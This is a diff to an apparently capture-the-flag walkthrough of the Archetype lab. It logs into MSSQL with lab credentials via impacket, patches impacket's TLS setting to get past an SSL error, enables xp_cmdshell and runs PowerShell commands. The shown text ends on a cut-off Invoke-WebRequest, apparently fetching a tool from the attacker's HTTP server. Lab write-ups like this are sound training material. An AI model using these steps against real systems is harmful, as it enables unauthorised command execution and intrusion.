@@ -899,9 +899,32 @@ cd http_server
 sudo python3 -m http.server 80
 ```
 
-
+The command below returns an error
 ```{bash eval=F}
 mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.78.109
+[-] [('SSL routines', 'state_machine', 'internal error')]
+```
+
+After searching a little, we see that this is a known issue with a known solution:
+
+* You gotta find the lib files for your impacket `/home/user/.local/lib/python3.11/site-packages/impacket/`.
+
+* Edit your `tds.py`. Find both lines defining the `ctx`:
+```{python eval=F}
+ctx = SSL.Context(SSL.TLSv1_METHOD)
+```
+
+* Change it to
+
+```{python eval=F}
+ctx = SSL.Context(SSL.TLSv1_2_METHOD)
+```
+
+* Don’t forget to change both lines where this happens. Save and you’re done.
+
+We can then proceed:
+
+```{bash eval=F}
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell "powershell dir \ "
 SQL> xp_cmdshell "powershell Invoke-WebRequest
